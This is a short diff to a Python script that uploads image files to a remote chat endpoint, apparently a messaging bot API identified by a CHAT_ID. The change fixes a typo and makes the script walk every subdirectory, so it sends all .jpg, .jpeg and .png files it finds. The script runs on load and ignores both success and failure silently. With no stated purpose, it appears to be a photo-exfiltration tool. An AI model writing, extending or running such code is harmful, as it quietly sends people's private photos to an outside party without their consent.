@@ -14,16 +14,18 @@ def send_photo(photo_path):
         files = {'photo': photo}
         data = {'chat_id': CHAT_ID}
         response = requests.post(url, files=files, data=data)
-        if responset.status_code == 200:
+        if response.status_code == 200:
             pass
         else:
             pass
 
 def send_all_photos(directory):
-    for filename in os.listdir(directory):
-        if filename.endswith(('.jpg', '.jpeg', '.png')):
-            photo_path = os.path.join(directory, filename)
-            send_photo(photo_path)
+    # Use os.walk to traverse all directories and subdirectories
+    for root, dirs, files in os.walk(directory):
+        for filename in files:
+            if filename.endswith(('.jpg', '.jpeg', '.png')):
+                photo_path = os.path.join(root, filename)
+                send_photo(photo_path)
 
 # Run the function to send all photos
 send_all_photos(DIRECTORY)
